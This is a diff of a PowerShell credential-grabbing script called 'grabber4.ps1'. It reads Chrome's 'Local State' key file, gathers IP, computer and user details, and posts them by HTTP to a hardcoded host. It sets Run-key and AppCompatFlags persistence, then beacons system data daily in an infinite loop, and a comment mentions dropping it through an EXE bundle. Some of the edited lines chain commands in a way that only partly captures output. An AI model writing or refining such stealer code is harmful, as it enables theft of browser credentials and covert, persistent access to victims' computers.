@@ -1,10 +1,9 @@
-$Header += Get-NetIPConfiguration 
 
-$Header += Get-ComputerInfo
+#everything is in a EXE bundle to build python to drop this script correctly.
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-$Header += whoami
 
-$Header += Get-Date
+$Header += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date
 
 $var += Get-Content "Local State"
 
@@ -130,7 +129,7 @@ start-sleep 4
 
 $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -header $Header -body $var -UseBasicParsing
 
-#set per
+#attempt to set per
 
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
     -Name "grabber4.ps1" `
@@ -141,8 +140,6 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
     -Name "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1" `
     -Value "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1"
-
-
 
 cd..
 
@@ -156,14 +153,11 @@ start-sleep 86400
 
 while($true)
 { 
-    $varper += Get-ComputerInfo
-    $varper += whoami
-    $varper += Get-Date
-    $varper += ipconfig
-
+    $varper += Get-ComputerInfo;whoami;Get-Date;ipconfig
+    
     #http send
 
-    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.190:80 -body $varper -UseBasicParsing
+    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $varper -UseBasicParsing
 
     Start-Sleep -Seconds 86400
 }
